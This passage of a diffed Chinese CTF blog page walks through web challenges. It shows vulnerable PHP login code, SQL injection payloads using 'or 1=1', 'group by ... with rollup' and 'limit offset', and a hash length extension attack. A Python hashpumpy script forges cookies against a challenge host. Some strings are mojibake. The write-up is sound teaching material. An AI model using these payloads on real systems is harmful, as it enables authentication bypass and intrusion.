class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_POST</span>[<span class="string">'uname'</span>]) || !isset(<span class="variable">$_POST</span>[<span class="string">'pwd'</span>])) &#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> AttackFilter(<span class="variable">$StrKey</span>,<span class="variable">$StrValue</span>,<span class="variable">$ArrReq</span>)&#123;  </span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$StrValue</span>))&#123;</span><br><span class="line">        <span class="variable">$StrValue</span>=implode(<span class="variable">$StrValue</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.<span class="variable">$ArrReq</span>.<span class="string">"/is"</span>,<span class="variable">$StrValue</span>)==1)&#123;   </span><br><span class="line">        <span class="built_in">print</span> <span class="string">"姘村彲杞借垷锛屼害鍙禌鑹囷紒"</span>;</span><br><span class="line">        <span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filter</span> = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</span><br><span class="line">foreach(<span class="variable">$_POST</span> as <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123; </span><br><span class="line">    AttackFilter(<span class="variable">$key</span>,<span class="variable">$value</span>,<span class="variable">$filter</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$con</span> = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)&#123;</span><br><span class="line">	die(<span class="string">'Could not connect: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$db</span>=<span class="string">"XXXXXX"</span>;</span><br><span class="line">mysql_select_db(<span class="variable">$db</span>, <span class="variable">$con</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;<span class="variable">$_POST</span>['uname']&#125;'"</span>;</span><br><span class="line"><span class="variable">$query</span> = mysql_query(<span class="variable">$sql</span>); </span><br><span class="line"><span class="keyword">if</span> (mysql_num_rows(<span class="variable">$query</span>) == 1) &#123; </span><br><span class="line">    <span class="variable">$key</span> = mysql_fetch_array(<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>[<span class="string">'pwd'</span>] == <span class="variable">$_POST</span>[<span class="string">'pwd'</span>]) &#123;</span><br><span class="line">        <span class="built_in">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">print</span> <span class="string">"浜﹀彲璧涜墖锛�"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="built_in">print</span> <span class="string">"涓€棰楄禌鑹囷紒"</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close(<span class="variable">$con</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
 <p>分析源码：</p>
 <ul>
 <li>第一大块是判断两个变量uname,pwd是否为空。</li>
 <li>第二大块是进行了sql过滤。</li>
 <li>第三大块查询了数据库，flag被两个if包括着，第一个if限定查询结果只有一行，第二个if要求pwd相等</li>
 </ul>
-<p>由于sql过滤严格，sql注入尝试无果。<br>考虑从pwd相等入手，利用 <strong>or</strong>,<a href="http://blog.csdn.net/keda8997110/article/details/8490895" target="_blank" rel="external"><strong>limit offset</strong></a>,  <strong>#</strong> 先过滤第一个if<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;or &apos;1&apos;=&apos;1&apos; limit 1 offset 0 #</div></pre></td></tr></table></figure></p>
-<p>第二个if 用到 <a href="http://www.w3school.com.cn/sql/sql_groupby.asp" target="_blank" rel="external"><strong>group by</strong></a> 和 <a href="http://www.68idc.cn/help/mysqldata/mysql/20150607358491.html" target="_blank" rel="external">with rollup</a> （rollup–&gt;汇总,使group by的列的值为null,汇总其他列的数值）<br>利用这两个函数，构造 null = null<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;or &apos;1&apos;=&apos;1&apos; group by pwd with rollup limit 1 offset 0#</div></pre></td></tr></table></figure></p>
+<p>由于sql过滤严格，sql注入尝试无果。<br>考虑从pwd相等入手，利用 <strong>or</strong>,<a href="http://blog.csdn.net/keda8997110/article/details/8490895" target="_blank" rel="noopener"><strong>limit offset</strong></a>,  <strong>#</strong> 先过滤第一个if<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;or &apos;1&apos;=&apos;1&apos; limit 1 offset 0 #</span><br></pre></td></tr></table></figure></p>
+<p>第二个if 用到 <a href="http://www.w3school.com.cn/sql/sql_groupby.asp" target="_blank" rel="noopener"><strong>group by</strong></a> 和 <a href="http://www.68idc.cn/help/mysqldata/mysql/20150607358491.html" target="_blank" rel="noopener">with rollup</a> （rollup–&gt;汇总,使group by的列的值为null,汇总其他列的数值）<br>利用这两个函数，构造 null = null<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;or &apos;1&apos;=&apos;1&apos; group by pwd with rollup limit 1 offset 0#</span><br></pre></td></tr></table></figure></p>
 <p>offset 0 到 n 尝试得到我们汇总 pwd = null 的那一行<br>同时使 pwd = null （不是填写null，空着就好）</p>
 <div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fjrebupellj30ic01ma9y.jpg" alt="4"><br></div>
 
 
-<h2 id="9-18-有点意思吧"><a href="#9-18-有点意思吧" class="headerlink" title="[9.18]有点意思吧"></a>[9.18]有点意思吧</h2><p><a href="http://ctf5.shiyanbar.com/web/kzhan.php" target="_blank" rel="external">戳这里=w=</a></p>
-<h3 id="涉及范围：php源码，hash长度扩展攻击"><a href="#涉及范围：php源码，hash长度扩展攻击" class="headerlink" title="涉及范围：php源码，hash长度扩展攻击"></a>涉及范围：php源码，hash长度扩展攻击</h3><p>抓包，source这个参数有点奇怪，尝试改为1，得到源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$flag</span> = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</div><div class="line"><span class="variable">$secret</span> = <span class="string">"XXXXXXXXXXXXXXX"</span>; // This secret is 15 characters long <span class="keyword">for</span> security!</div><div class="line"></div><div class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">"username"</span>];</div><div class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">"password"</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!empty(<span class="variable">$_COOKIE</span>[<span class="string">"getmein"</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (urldecode(<span class="variable">$username</span>) === <span class="string">"admin"</span> &amp;&amp; urldecode(<span class="variable">$password</span>) != <span class="string">"admin"</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="variable">$COOKIE</span>[<span class="string">"getmein"</span>] === md5(<span class="variable">$secret</span> . urldecode(<span class="variable">$username</span> . <span class="variable">$password</span>))) &#123;</div><div class="line">            <span class="built_in">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</div><div class="line">            die (<span class="string">"The flag is "</span>. <span class="variable">$flag</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> &#123;</div><div class="line">            die (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> &#123;</div><div class="line">        die (<span class="string">"You are not an admin! LEAVE."</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">setcookie(<span class="string">"sample-hash"</span>, md5(<span class="variable">$secret</span> . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (60 * 60 * 24 * 7));</div><div class="line"></div><div class="line"><span class="keyword">if</span> (empty(<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>])) &#123;</div><div class="line">    setcookie(<span class="string">"source"</span>, 0, time() + (60 * 60 * 24 * 7));</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>] != 0) &#123;</div><div class="line">        <span class="built_in">echo</span> <span class="string">""</span>; // This <span class="built_in">source</span> code is outputted here</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="9-18-有点意思吧"><a href="#9-18-有点意思吧" class="headerlink" title="[9.18]有点意思吧"></a>[9.18]有点意思吧</h2><p><a href="http://ctf5.shiyanbar.com/web/kzhan.php" target="_blank" rel="noopener">戳这里=w=</a></p>
+<h3 id="涉及范围：php源码，hash长度扩展攻击"><a href="#涉及范围：php源码，hash长度扩展攻击" class="headerlink" title="涉及范围：php源码，hash长度扩展攻击"></a>涉及范围：php源码，hash长度扩展攻击</h3><p>抓包，source这个参数有点奇怪，尝试改为1，得到源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span> = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line"><span class="variable">$secret</span> = <span class="string">"XXXXXXXXXXXXXXX"</span>; // This secret is 15 characters long <span class="keyword">for</span> security!</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">"username"</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!empty(<span class="variable">$_COOKIE</span>[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode(<span class="variable">$username</span>) === <span class="string">"admin"</span> &amp;&amp; urldecode(<span class="variable">$password</span>) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$COOKIE</span>[<span class="string">"getmein"</span>] === md5(<span class="variable">$secret</span> . urldecode(<span class="variable">$username</span> . <span class="variable">$password</span>))) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            die (<span class="string">"The flag is "</span>. <span class="variable">$flag</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            die (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        die (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5(<span class="variable">$secret</span> . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (60 * 60 * 24 * 7));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (empty(<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, 0, time() + (60 * 60 * 24 * 7));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>] != 0) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">""</span>; // This <span class="built_in">source</span> code is outputted here</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>分析源码：</p>
 <ul>
 <li>第一个if：要求cookie里的<strong>getmein</strong>不为空</li>
@@ -373,31 +205,31 @@
 </ul>
 <p>因为MD5，url解码，一开始以为是php语言漏洞，诸多尝试无果。<br>仔细收集已有信息，分析问题如下<br>有 <strong>未知15位secret+’admin’+’admin’</strong> 的hash<br>求 <strong>未知15位secret+’admin’+password</strong> 的hash<br>查阅资料，新的知识盲区，密码学知识： <a href="//www.freebuf.com/articles/web/31756.html">hash长度扩展攻击</a><br>之后的题解就参考别人的吧：</p>
 <ul>
-<li><a href="http://blog.csdn.net/syh_486_007/article/details/51228628" target="_blank" rel="external">c语言MD5的题解</a>:最后一步计算MD5前512位随便是因为在C代码中ABCD改的不是初始值，而是512为整数的分组执行完毕之后的ABCD。</li>
-<li><a href="http://blog.csdn.net/u010726042/article/details/70738279" target="_blank" rel="external">python的题解hashpumpy和hashpump</a></li>
+<li><a href="http://blog.csdn.net/syh_486_007/article/details/51228628" target="_blank" rel="noopener">c语言MD5的题解</a>:最后一步计算MD5前512位随便是因为在C代码中ABCD改的不是初始值，而是512为整数的分组执行完毕之后的ABCD。</li>
+<li><a href="http://blog.csdn.net/u010726042/article/details/70738279" target="_blank" rel="noopener">python的题解hashpumpy和hashpump</a></li>
 </ul>
 <p>然后是给自己以后看,方便回忆的粗糙原理手绘图QAQ<br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fjrf3ssur3j31hc0u0n6d.jpg" alt="hash长度攻击,png"></p>
 <ul>
 <li>512位的分组后面第一位写1,再补零，后64位写原来的长度，使之生成的MD5与secretadminadmin的完全一致</li>
 <li>本地生成MD5时，512位的分组随便填写，最后一次变换的ABCD值用secretadminadmin的MD5值转变来（高地位互换），之所以要512位的分组是让最后填充的长度数值相同</li>
 </ul>
-<h2 id="有点意思吧2"><a href="#有点意思吧2" class="headerlink" title="有点意思吧2"></a>有点意思吧2</h2><p><a href="http://web.jarvisoj.com:32778/" target="_blank" rel="external">戳这里=w=</a><br>此题前提：[9.18]有点意思吧</p>
+<h2 id="有点意思吧2"><a href="#有点意思吧2" class="headerlink" title="有点意思吧2"></a>有点意思吧2</h2><p><a href="http://web.jarvisoj.com:32778/" target="_blank" rel="noopener">戳这里=w=</a><br>此题前提：[9.18]有点意思吧</p>
 <h3 id="涉及范围：目录遍历-file命令-swp，php源码-hash长度攻击-脚本"><a href="#涉及范围：目录遍历-file命令-swp，php源码-hash长度攻击-脚本" class="headerlink" title="涉及范围：目录遍历,file命令,.swp，php源码,hash长度攻击,脚本"></a>涉及范围：目录遍历,file命令,.swp，php源码,hash长度攻击,脚本</h3><div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fjsm8frpyfj30no03xq2q.jpg" alt="1"><br></div>
 
-<p>web日常1：先看源码，没啥东西。<br>web日常2：跑目录——用字典替换url后缀，访问，查看是否成功。可用burpsuite+字典 或 <a href="https://github.com/Err0rzz/SourceLeakHacker" target="_blank" rel="external">工具</a></p>
+<p>web日常1：先看源码，没啥东西。<br>web日常2：跑目录——用字典替换url后缀，访问，查看是否成功。可用burpsuite+字典 或 <a href="https://github.com/Err0rzz/SourceLeakHacker" target="_blank" rel="noopener">工具</a></p>
 <div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fjsm8ujz3kj30m108iwj3.jpg" alt="2"><br></div>
 
 <p>(多线程 HTTPConnectionPool问题 暂未解决)<br>看到<strong>index.php~</strong>,访问，下载过来一个文件<br>文件日常：拉到kali下用file，binwalk 判断文件类型和有没有隐藏 （后缀是~,和开头是 . 的文件在桌面不直接显示，需要<strong>ls</strong>查看）</p>
 <div align="center"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fjsm91ak2kj30fs06jgnq.jpg" alt="3"><br></div>
 
 <p><strong>vim的swp格式</strong>：vim编写的文件可能会有错误遗留文件：data.php –&gt; .data.php.swp (若修改文件再次错误 后缀变为.swo .swn 尾字母向前推移)</p>
-<p>index.php~加上.swp后缀。用<strong>vim -r index.php~.swp</strong> 恢复读写模式可以打开，得到页面源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;Web 350&lt;/title&gt;</div><div class="line">&lt;style <span class="built_in">type</span>=<span class="string">"text/css"</span>&gt;</div><div class="line">        body &#123;</div><div class="line">                background:gray;</div><div class="line">                text-align:center;</div><div class="line">        &#125;</div><div class="line">&lt;/style&gt;</div><div class="line">&lt;/head&gt;</div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line">        &lt;?php</div><div class="line">                <span class="variable">$auth</span> = <span class="literal">false</span>;</div><div class="line">                <span class="variable">$role</span> = <span class="string">"guest"</span>;</div><div class="line">                <span class="variable">$salt</span> =</div><div class="line">                <span class="keyword">if</span> (isset(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>])) &#123;</div><div class="line">                        <span class="variable">$role</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>]);</div><div class="line">                        <span class="variable">$hsh</span> = <span class="variable">$_COOKIE</span>[<span class="string">"hsh"</span>];</div><div class="line">                        <span class="keyword">if</span> (<span class="variable">$role</span>===<span class="string">"admin"</span> &amp;&amp; <span class="variable">$hsh</span> === md5(<span class="variable">$salt</span>.strrev(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>]))) &#123;</div><div class="line">                                <span class="variable">$auth</span> = <span class="literal">true</span>;</div><div class="line">                        &#125; <span class="keyword">else</span> &#123;</div><div class="line">                                <span class="variable">$auth</span> = <span class="literal">false</span>;</div><div class="line">                        &#125;</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                        <span class="variable">$s</span> = serialize(<span class="variable">$role</span>);</div><div class="line">                        setcookie(<span class="string">'role'</span>,<span class="variable">$s</span>);</div><div class="line">                        <span class="variable">$hsh</span> = md5(<span class="variable">$salt</span>.strrev(<span class="variable">$s</span>));</div><div class="line">                        setcookie(<span class="string">'hsh'</span>,<span class="variable">$hsh</span>);</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">if</span> (<span class="variable">$auth</span>) &#123;</div><div class="line">                        <span class="built_in">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is“</span></div><div class="line"><span class="string">                &#125; else &#123;</span></div><div class="line"><span class="string">                        echo "</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">";</span></div><div class="line"><span class="string">                &#125;</span></div><div class="line"><span class="string">        ?&gt;</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">&lt;/body&gt;</span></div><div class="line"><span class="string">&lt;/html&gt;</span></div></pre></td></tr></table></figure></p>
-<p><a href="https://phperzh.com/articles/1814" target="_blank" rel="external">serialize与unserialize函数</a>      <a href="http://www.w3school.com.cn/php/func_string_strrev.asp" target="_blank" rel="external">strrev函数</a><br>结合抓包，分析源码：</p>
+<p>index.php~加上.swp后缀。用<strong>vim -r index.php~.swp</strong> 恢复读写模式可以打开，得到页面源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web 350&lt;/title&gt;</span><br><span class="line">&lt;style <span class="built_in">type</span>=<span class="string">"text/css"</span>&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">                background:gray;</span><br><span class="line">                text-align:center;</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">                <span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line">                <span class="variable">$role</span> = <span class="string">"guest"</span>;</span><br><span class="line">                <span class="variable">$salt</span> =</span><br><span class="line">                <span class="keyword">if</span> (isset(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>])) &#123;</span><br><span class="line">                        <span class="variable">$role</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>]);</span><br><span class="line">                        <span class="variable">$hsh</span> = <span class="variable">$_COOKIE</span>[<span class="string">"hsh"</span>];</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$role</span>===<span class="string">"admin"</span> &amp;&amp; <span class="variable">$hsh</span> === md5(<span class="variable">$salt</span>.strrev(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>]))) &#123;</span><br><span class="line">                                <span class="variable">$auth</span> = <span class="literal">true</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$s</span> = serialize(<span class="variable">$role</span>);</span><br><span class="line">                        setcookie(<span class="string">'role'</span>,<span class="variable">$s</span>);</span><br><span class="line">                        <span class="variable">$hsh</span> = md5(<span class="variable">$salt</span>.strrev(<span class="variable">$s</span>));</span><br><span class="line">                        setcookie(<span class="string">'hsh'</span>,<span class="variable">$hsh</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$auth</span>) &#123;</span><br><span class="line">                        <span class="built_in">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is“</span></span><br><span class="line"><span class="string">                &#125; else &#123;</span></span><br><span class="line"><span class="string">                        echo "</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">";</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">        ?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><a href="https://phperzh.com/articles/1814" target="_blank" rel="noopener">serialize与unserialize函数</a>      <a href="http://www.w3school.com.cn/php/func_string_strrev.asp" target="_blank" rel="noopener">strrev函数</a><br>结合抓包，分析源码：</p>
 <ul>
 <li>要求 role不为空 ，此处必然满足，不考虑</li>
 <li>要求 role反序列化后 === ‘admin’</li>
 <li>要求 MD5（salt.role的反转字符串） === hsh</li>
-<li>已知 MD5($salt.”<strong>;”tseug”:5:s</strong>“) = 3a4727d57463f122833d9e732f94e4e0<br>解决第一个反序列化后相等，利用<a href="https://phperzh.com/articles/1814" target="_blank" rel="external">php在线</a>测试序列化与反序列化的特性及漏洞：</li>
+<li>已知 MD5($salt.”<strong>;”tseug”:5:s</strong>“) = 3a4727d57463f122833d9e732f94e4e0<br>解决第一个反序列化后相等，利用<a href="https://phperzh.com/articles/1814" target="_blank" rel="noopener">php在线</a>测试序列化与反序列化的特性及漏洞：</li>
 </ul>
 <div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fjsm98tiabj30ug072q30.jpg" alt="4"><br></div>
 
@@ -410,13 +242,13 @@
 <li>salt的长度未知，考虑利用python脚本暴力破解</li>
 </ul>
 <p>python脚本如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># encoding=utf8</span></div><div class="line"><span class="comment">#   md5($salt." ;"tseug":5:s ") = 3a4727d57463f122833d9e732f94e4e0 </span></div><div class="line"><span class="comment">#   md5($salt." ;"tseug":5:s xxxxx ;"nimda":5:s ") = xxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> hashpumpy</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"></div><div class="line">hexdigest = <span class="string">"3a4727d57463f122833d9e732f94e4e0"</span>;</div><div class="line">original_data = <span class="string">";\"tseug\":5:s"</span>;</div><div class="line">data_to_add = <span class="string">";\"nimda\":5:s"</span>;</div><div class="line">url=<span class="string">"http://web.jarvisoj.com:32778"</span>;</div><div class="line"></div><div class="line"><span class="comment">#设置key_length的范围</span></div><div class="line"><span class="keyword">for</span> key_length <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">15</span>):</div><div class="line">	result = hashpumpy.hashpump(hexdigest,original_data,data_to_add,key_length);</div><div class="line"></div><div class="line">	role_re = result[<span class="number">1</span>][::<span class="number">-1</span>];  	 <span class="comment">#16进制\x80 代表一个字符 可以直接对换</span></div><div class="line">	role = urllib.quote(role_re); 	 <span class="comment">#16进制直接url编码得到 %xx</span></div><div class="line">	hsh = result[<span class="number">0</span>];</div><div class="line">	cookies = &#123;<span class="string">'role'</span>:role,<span class="string">'hsh'</span>:hsh&#125;;</div><div class="line">	</div><div class="line">	response = requests.get(url,cookies=cookies);</div><div class="line">	<span class="keyword">if</span> response.headers[<span class="string">'Content-Length'</span>] != 